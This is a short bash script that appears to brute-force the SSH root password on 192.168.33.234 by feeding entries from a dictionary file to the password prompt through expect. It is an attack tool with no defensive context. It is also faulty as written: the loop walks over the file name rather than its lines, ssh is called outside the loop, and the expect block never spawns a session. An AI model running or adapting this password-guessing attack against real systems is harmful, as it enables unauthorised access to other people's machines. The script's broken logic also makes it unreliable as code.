#!/bin/bash
dicts_file=./dicts
ssh root@192.168.33.234
for each_pw in $dicts_file
do
    /usr/bin/expect <<-EOF
            expect {
            "yes/no" { send "yes\r";exp_continue }
            "password:" { send "$each_pw\r" }
            }
            expect eof
EOF
done